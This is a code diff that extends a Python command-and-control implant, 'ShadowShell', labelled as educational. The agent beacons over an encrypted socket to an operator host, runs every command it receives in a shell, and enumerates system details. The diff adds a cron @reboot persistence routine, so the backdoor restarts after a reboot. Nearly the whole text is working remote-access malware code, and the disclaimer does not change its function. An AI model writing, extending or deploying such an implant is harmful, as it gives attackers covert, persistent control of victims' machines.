@@ -7,7 +7,7 @@ import platform
 import os
 from cryptography.fernet import Fernet
 
-# ShadowShell C2 Agent (Encrypted + Beaconing)
+# ShadowShell C2 Agent (Encrypted + Beaconing + Persistence)
 # Educational use only. Authorized lab testing only.
 
 def load_key():
@@ -19,7 +19,6 @@ def load_key():
         exit(1)
 
 def get_sysinfo():
-    # Basic system enumeration for post-exploitation
     info = f"""
     Hostname: {platform.node()}
     OS: {platform.system()} {platform.release()}
@@ -28,8 +27,30 @@ def get_sysinfo():
     """
     return info
 
+def install_persistence(host, port):
+    try:
+        # Get the absolute path of this script and the python binary
+        script_path = os.path.abspath(__file__)
+        python_path = subprocess.run(["which", "python3"], capture_output=True, text=True).stdout.strip()
+        
+        # Create the cron command to run on reboot
+        cron_cmd = f"@reboot {python_path} {script_path} --host {host} --port {port}\n"
+        
+        # Get current crontab (if any) to avoid overwriting
+        current_cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
+        
+        if "ShadowShell" in current_cron:
+            return "[+] Persistence already installed."
+            
+        # Append our cron job and install
+        new_cron = current_cron + cron_cmd
+        subprocess.run(["crontab", "-"], input=new_cron, text=True, shell=True)
+        
+        return "[+] Persistence installed successfully (cron @reboot)."
+    except Exception as e:
+        return f"[-] Failed to install persistence: {e}"
+
 def connect_to_server(host, port, fernet, sleep_time, jitter_percent):
-    # The first beacon is just a check-in message
     pending_output = b"ShadowShell Agent checked in. Awaiting commands.\n"
     
     while True:
@@ -37,24 +58,23 @@ def connect_to_server(host, port, fernet, sleep_time, jitter_percent):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
             
-            # 1. Send pending output (or initial check-in) - ENCRYPTED
             encrypted_output = fernet.encrypt(pending_output)
             sock.send(encrypted_output)
             
-            # 2. Receive encrypted command
             encrypted_cmd = sock.recv(4096)
             try:
                 cmd = fernet.decrypt(encrypted_cmd).decode('utf-8')
             except Exception:
-                break # Exit if we can't decrypt
+                break
             
-            # 3. Process command
             if cmd.lower() == 'exit':
                 break
             
-            # 4. Execute command
+            # Command routing
             if cmd.lower() == 'sysinfo':
                 pending_output = get_sysinfo().encode('utf-8')
+            elif cmd.lower() == 'persist':
+                pending_output = install_persistence(host, port).encode('utf-8')
             else:
                 try:
                     output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -67,10 +87,8 @@ def connect_to_server(host, port, fernet, sleep_time, jitter_percent):
             
             sock.close()
             
-            # 5. Sleep with jitter before next check-in
-            # Jitter is calculated as a percentage of the sleep time
             jitter = random.uniform(-jitter_percent, jitter_percent) * sleep_time
-            actual_sleep = max(1, sleep_time + jitter) # Ensure at least 1 second sleep
+            actual_sleep = max(1, sleep_time + jitter)
             time.sleep(actual_sleep)
             
         except ConnectionRefusedError:
